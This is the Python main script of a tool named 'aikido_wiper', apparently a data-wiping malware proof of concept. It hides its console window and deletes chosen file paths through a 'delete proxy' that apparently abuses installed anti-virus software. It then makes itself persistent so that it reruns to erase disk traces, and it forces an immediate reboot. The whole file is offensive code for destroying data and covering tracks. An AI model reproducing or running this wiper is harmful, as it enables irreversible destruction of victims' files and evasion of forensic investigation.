import os
import time

from aikido_wiper.wipe_utils import erase_disk_traces
from configs.args import parse_args, create_proxy_from_conf, find_deletion_targets_from_args
from aikido_wiper.windows_utils import stay_persistent_with_args, kill_process_window, get_existing_anti_virus_display_names     


def main():
    args = parse_args()

    if args.quiet:
        kill_process_window()

    if "ERASE_DISK_TRACES" == args.mode:
        erase_disk_traces()
        return 0
    
    delete_proxy = create_proxy_from_conf(args)
    deletion_targets = find_deletion_targets_from_args(args)
    
    before = time.time()
    failed_targets = delete_proxy.indirect_delete_paths(deletion_targets)
    after = time.time()

    print("Failed targets:")
    print("------------------------")
    for path in failed_targets:
        print(path)
    print("------------------------")

    print(f"The deletion took {after - before} seconds")

    stay_persistent_with_args(cmd_args="-q ERASE_DISK_TRACES")
    os.system("shutdown -t 0 -r -f")

    return 0

if __name__ == "__main__":
    main()